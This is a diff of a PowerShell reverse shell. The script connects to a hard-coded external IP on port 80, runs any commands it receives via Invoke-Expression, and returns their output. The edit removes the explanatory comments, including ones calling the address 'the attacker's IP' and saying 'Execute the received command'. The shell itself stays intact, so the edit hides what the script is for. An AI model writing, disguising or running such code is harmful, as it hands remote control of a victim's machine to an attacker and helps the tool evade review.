@@ -1,5 +1,5 @@
-$ip = "151.248.146.70"  # Replace with the attacker's IP address
-$port = 80         # Replace with the attacker's listening port
+$ip = "151.248.146.70"  
+$port = 80         
 $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
 $stream = $client.GetStream()
 $writer = New-Object System.IO.StreamWriter($stream)
@@ -12,12 +12,12 @@ try {
         try {
             $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
             if ($bytesRead -le 0) {
-                break  # Exit the loop if no data is read, indicating the connection is closed
+                break  
             }
             $data = $encoding.GetString($buffer, 0, $bytesRead)
 
             try {
-                # Execute the received command
+                
                 $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
             } catch {
                 # Catch any errors from invalid commands and send them back
@@ -34,10 +34,8 @@ try {
         }
     }
 } catch {
-    # Handle errors (e.g., connection lost)
     $writer.WriteLine("Connection closed.")
 } finally {
-    # Close the connection properly
     $client.Close()
     exit
 }
